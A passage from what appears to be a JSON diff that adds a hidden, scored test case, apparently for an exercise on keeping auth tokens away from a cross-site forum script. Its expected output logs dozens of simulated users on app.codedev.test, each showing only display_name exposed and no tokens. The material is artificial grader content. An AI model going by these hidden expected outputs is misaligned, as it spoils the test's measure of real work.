Tran\"\nu_1011 GET /me: 200\nu_1011 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1011 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1012 login: 200, SPA shows \"Hi, Lan Hoang\"\nu_1012 GET /me: 200\nu_1012 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1012 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1013 login: 200, SPA shows \"Hi, Minh Bui\"\nu_1013 GET /me: 200\nu_1013 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1013 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1014 login: 200, SPA shows \"Hi, Thu Dang (mentor)\"\nu_1014 GET /me: 200\nu_1014 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1014 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1015 login: 200, SPA shows \"Hi, Huy Vo\"\nu_1015 GET /me: 200\nu_1015 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1015 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1016 login: 200, SPA shows \"Hi, Mai Nguyen\"\nu_1016 GET /me: 200\nu_1016 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1016 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1017 login: 200, SPA shows \"Hi, Khoa Pham\"\nu_1017 GET /me: 200\nu_1017 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1017 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1018 login: 200, SPA shows \"Hi, Linh Dang\"\nu_1018 GET /me: 200\nu_1018 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1018 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1019 login: 200, SPA shows \"Hi, Duc Tran\"\nu_1019 GET /me: 200\nu_1019 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1019 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1020 login: 200, SPA shows \"Hi, An Hoang\"\nu_1020 GET /me: 200\nu_1020 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1020 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1021 login: 200, SPA shows \"Hi, Bao Vo (mentor)\"\nu_1021 GET /me: 200\nu_1021 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1021 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1022 login: 200, SPA shows \"Hi, Chi Le\"\nu_1022 GET /me: 200\nu_1022 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1022 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1023 login: 200, SPA shows \"Hi, Phuong Vo\"\nu_1023 GET /me: 200\nu_1023 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1023 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1024 login: 200, SPA shows \"Hi, Lan Nguyen\"\nu_1024 GET /me: 200\nu_1024 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1024 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1025 login: 200, SPA shows \"Hi, Minh Pham\"\nu_1025 GET /me: 200\nu_1025 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1025 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1026 login: 200, SPA shows \"Hi, Thu Dang\"\nu_1026 GET /me: 200\nu_1026 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1026 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1027 login: 200, SPA shows \"Hi, Huy Tran\"\nu_1027 GET /me: 200\nu_1027 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1027 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1028 login: 200, SPA shows \"Hi, Mai Hoang (mentor)\"\nu_1028 GET /me: 200\nu_1028 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1028 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1029 login: 200, SPA shows \"Hi, Khoa Bui\"\nu_1029 GET /me: 200\nu_1029 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1029 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1030 login: 200, SPA shows \"Hi, Linh Le\"\nu_1030 GET /me: 200\nu_1030 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1030 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1031 login: 200, SPA shows \"Hi, Duc Vo\"\nu_1031 GET /me: 200\nu_1031 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1031 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1032 login: 200, SPA shows \"Hi, An Nguyen\"\nu_1032 GET /me: 200\nu_1032 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1032 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1033 login: 200, SPA shows \"Hi, Bao Pham\"\nu_1033 GET /me: 200\nu_1033 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1033 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1034 login: 200, SPA shows \"Hi, Chi Dang\"\nu_1034 GET /me: 200\nu_1034 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1034 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1035 login: 200, SPA shows \"Hi, Phuong Pham (mentor)\"\nu_1035 GET /me: 200\nu_1035 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1035 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1036 login: 200, SPA shows \"Hi, Lan Hoang\"\nu_1036 GET /me: 200\nu_1036 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1036 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1037 login: 200, SPA shows \"Hi, Minh Bui\"\nu_1037 GET /me: 200\nu_1037 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1037 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1038 login: 200, SPA shows \"Hi, Thu Le\"\nu_1038 GET /me: 200\nu_1038 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1038 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1039 login: 200, SPA shows \"Hi, Huy Vo\"\nu_1039 GET /me: 200\nu_1039 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1039 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1040 login: 200, SPA shows \"Hi, Mai Nguyen\"\nu_1040 GET /me: 200\nu_1040 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1040 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1041 login: 200, SPA shows \"Hi, Khoa Pham\"\nu_1041 GET /me: 200\nu_1041 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1041 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1042 login: 200, SPA shows \"Hi, Linh Le (mentor)\"\nu_1042 GET /me: 200\nu_1042 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1042 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1043 login: 200, SPA shows \"Hi, Duc Tran\"\nu_1043 GET /me: 200\nu_1043 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1043 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1044 login: 200, SPA shows \"Hi, An Hoang\"\nu_1044 GET /me: 200\nu_1044 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1044 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1045 login: 200, SPA shows \"Hi, Bao Bui\"\nu_1045 GET /me: 200\nu_1045 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1045 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1046 login: 200, SPA shows \"Hi, Chi Le\"\nu_1046 GET /me: 200\nu_1046 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1046 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1047 login: 200, SPA shows \"Hi, Phuong Vo\"\nu_1047 GET /me: 200\nu_1047 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1047 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1048 login: 200, SPA shows \"Hi, Lan Nguyen\"\nu_1048 GET /me: 200\nu_1048 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1048 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1049 login: 200, SPA shows \"Hi, Minh Tran (mentor)\"\nu_1049 GET /me: 200\nu_1049 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1049 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1050 login: 200, SPA shows \"Hi, Thu Dang\"\nu_1050 GET /me: 200\nu_1050 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1050 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1051 login: 200, SPA shows \"Hi, Huy Tran\"\nu_1051 GET /me: 200\nu_1051 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1051 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1052 login: 200, SPA shows \"Hi, Mai Hoang\"\nu_1052 GET /me: 200\nu_1052 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1052 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1053 login: 200, SPA shows \"Hi, Khoa Bui\"\nu_1053 GET /me: 200\nu_1053 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1053 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1054 login: 200, SPA shows \"Hi, Linh Le\"\nu_1054 GET /me: 200\nu_1054 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1054 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1055 login: 200, SPA shows \"Hi, Duc Vo\"\nu_1055 GET /me: 200\nu_1055 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1055 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1056 login: 200, SPA shows \"Hi, An Nguyen (mentor)\"\nu_1056 GET /me: 200\nu_1056 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1056 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1057 login: 200, SPA shows \"Hi, Bao Pham\"\nu_1057 GET /me: 200\nu_1057 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1057 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1058 login: 200, SPA shows \"Hi, Chi Dang\"\nu_1058 GET /me: 200\nu_1058 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1058 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1059 login: 200, SPA shows \"Hi, Phuong Tran\"\nu_1059 GET /me: 200\nu_1059 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1059 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1060 login: 200, SPA shows \"Hi, Lan Hoang\"\nu_1060 GET /me: 200\nu_1060 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1060 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1061 login: 200, SPA shows \"Hi, Minh Bui\"\nu_1061 GET /me: 200\nu_1061 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1061 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1062 login: 200, SPA shows \"Hi, Thu Le\"\nu_1062 GET /me: 200\nu_1062 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1062 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1063 login: 200, SPA shows \"Hi, Huy Bui (mentor)\"\nu_1063 GET /me: 200\nu_1063 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1063 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1064 login: 200, SPA shows \"Hi, Mai Nguyen\"\nu_1064 GET /me: 200\nu_1064 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1064 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1065 login: 200, SPA shows \"Hi, Khoa Pham\"\nu_1065 GET /me: 200\nu_1065 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1065 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1066 login: 200, SPA shows \"Hi, Linh Dang\"\nu_1066 GET /me: 200\nu_1066 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1066 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1067 login: 200, SPA shows \"Hi, Duc Tran\"\nu_1067 GET /me: 200\nu_1067 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1067 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1068 login: 200, SPA shows \"Hi, An Hoang\"\nu_1068 GET /me: 200\nu_1068 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1068 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1069 login: 200, SPA shows \"Hi, Bao Bui\"\nu_1069 GET /me: 200\nu_1069 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1069 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1070 login: 200, SPA shows \"Hi, Chi Dang (mentor)\"\nu_1070 GET /me: 200\nu_1070 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1070 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1071 login: 200, SPA shows \"Hi, Phuong Vo\"\nu_1071 GET /me: 200\nu_1071 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1071 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1072 login: 200, SPA shows \"Hi, Lan Nguyen\"\nu_1072 GET /me: 200\nu_1072 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1072 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1073 login: 200, SPA shows \"Hi, Minh Pham\"\nu_1073 GET /me: 200\nu_1073 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1073 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1074 login: 200, SPA shows \"Hi, Thu Dang\"\nu_1074 GET /me: 200\nu_1074 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1074 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1075 login: 200, SPA shows \"Hi, Huy Tran\"\nu_1075 GET /me: 200\nu_1075 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1075 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1076 login: 200, SPA shows \"Hi, Mai Hoang\"\nu_1076 GET /me: 200\nu_1076 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1076 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1077 login: 200, SPA shows \"Hi, Khoa Vo (mentor)\"\nu_1077 GET /me: 200\nu_1077 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1077 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1078 login: 200, SPA shows \"Hi, Linh Le\"\nu_1078 GET /me: 200\nu_1078 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1078 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1079 login: 200, SPA shows \"Hi, Duc Vo\"\nu_1079 GET /me: 200\nu_1079 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1079 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1080 login: 200, SPA shows \"Hi, An Nguyen\"\nu_1080 GET /me: 200\nu_1080 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1080 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1081 login: 200, SPA shows \"Hi, Bao Pham\"\nu_1081 GET /me: 200\nu_1081 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1081 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1082 login: 200, SPA shows \"Hi, Chi Dang\"\nu_1082 GET /me: 200\nu_1082 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1082 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1083 login: 200, SPA shows \"Hi, Phuong Tran\"\nu_1083 GET /me: 200\nu_1083 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1083 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1084 login: 200, SPA shows \"Hi, Lan Hoang (mentor)\"\nu_1084 GET /me: 200\nu_1084 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1084 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1085 login: 200, SPA shows \"Hi, Minh Bui\"\nu_1085 GET /me: 200\nu_1085 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1085 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1086 login: 200, SPA shows \"Hi, Thu Le\"\nu_1086 GET /me: 200\nu_1086 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1086 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1087 login: 200, SPA shows \"Hi, Huy Vo\"\nu_1087 GET /me: 200\nu_1087 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1087 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1088 login: 200, SPA shows \"Hi, Mai Nguyen\"\nu_1088 GET /me: 200\nu_1088 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1088 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1089 login: 200, SPA shows \"Hi, Khoa Pham\"\nu_1089 GET /me: 200\nu_1089 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1089 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1090 login: 200, SPA shows \"Hi, Linh Dang\"\nu_1090 GET /me: 200\nu_1090 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1090 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1091 login: 200, SPA shows \"Hi, Duc Pham (mentor)\"\nu_1091 GET /me: 200\nu_1091 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1091 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1092 login: 200, SPA shows \"Hi, An Hoang\"\nu_1092 GET /me: 200\nu_1092 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1092 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1093 login: 200, SPA shows \"Hi, Bao Bui\"\nu_1093 GET /me: 200\nu_1093 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1093 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1094 login: 200, SPA shows \"Hi, Chi Le\"\nu_1094 GET /me: 200\nu_1094 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1094 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1095 login: 200, SPA shows \"Hi, Phuong Vo\"\nu_1095 GET /me: 200\nu_1095 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1095 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1096 login: 200, SPA shows \"Hi, Lan Nguyen\"\nu_1096 GET /me: 200\nu_1096 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1096 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1097 login: 200, SPA shows \"Hi, Minh Pham\"\nu_1097 GET /me: 200\nu_1097 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1097 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1098 login: 200, SPA shows \"Hi, Thu Le (mentor)\"\nu_1098 GET /me: 200\nu_1098 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1098 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1099 login: 200, SPA shows \"Hi, Huy Tran\"\nu_1099 GET /me: 200\nu_1099 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1099 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1100 login: 200, SPA shows \"Hi, Mai Hoang\"\nu_1100 GET /me: 200\nu_1100 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1100 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1101 login: 200, SPA shows \"Hi, Khoa Bui\"\nu_1101 GET /me: 200\nu_1101 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1101 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1102 login: 200, SPA shows \"Hi, Linh Le\"\nu_1102 GET /me: 200\nu_1102 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1102 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1103 login: 200, SPA shows \"Hi, Duc Vo\"\nu_1103 GET /me: 200\nu_1103 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1103 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1104 login: 200, SPA shows \"Hi, An Nguyen\"\nu_1104 GET /me: 200\nu_1104 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1104 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1105 login: 200, SPA shows \"Hi, Bao Tran (mentor)\"\nu_1105 GET /me: 200\nu_1105 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1105 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1106 login: 200, SPA shows \"Hi, Chi Dang\"\nu_1106 GET /me: 200\nu_1106 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1106 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1107 login: 200, SPA shows \"Hi, Phuong Tran\"\nu_1107 GET /me: 200\nu_1107 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1107 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1108 login: 200, SPA shows \"Hi, Lan Hoang\"\nu_1108 GET /me: 200\nu_1108 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1108 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1109 login: 200, SPA shows \"Hi, Minh Bui\"\nu_1109 GET /me: 200\nu_1109 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1109 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1110 login: 200, SPA shows \"Hi, Thu Le\"\nu_1110 GET /me: 200\nu_1110 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1110 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1111 login: 200, SPA shows \"Hi, Huy Vo\"\nu_1111 GET /me: 200\nu_1111 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1111 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1112 login: 200, SPA shows \"Hi, Mai Nguyen (mentor)\"\nu_1112 GET /me: 200\nu_1112 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1112 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1113 login: 200, SPA shows \"Hi, Khoa Pham\"\nu_1113 GET /me: 200\nu_1113 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1113 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1114 login: 200, SPA shows \"Hi, Linh Dang\"\nu_1114 GET /me: 200\nu_1114 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1114 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1115 login: 200, SPA shows \"Hi, Duc Tran\"\nu_1115 GET /me: 200\nu_1115 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1115 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1116 login: 200, SPA shows \"Hi, An Hoang\"\nu_1116 GET /me: 200\nu_1116 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1116 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1117 login: 200, SPA shows \"Hi, Bao Bui\"\nu_1117 GET /me: 200\nu_1117 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1117 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1118 login: 200, SPA shows \"Hi, Chi Le\"\nu_1118 GET /me: 200\nu_1118 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1118 forum.codedev.test receives: [display_name], tokens exposed: none\nu_1119 login: 200, SPA shows \"Hi, Phuong Bui (mentor)\"\nu_1119 GET /me: 200\nu_1119 script on app.codedev.test: cookies [display_name], localStorage [], tokens exposed: none\nu_1119 forum.codedev.test receives: [display_name], tokens exposed: none",
+          "hidden": true,
+          "score": 2
+        }
+      ]
+    }
+  ]
+}
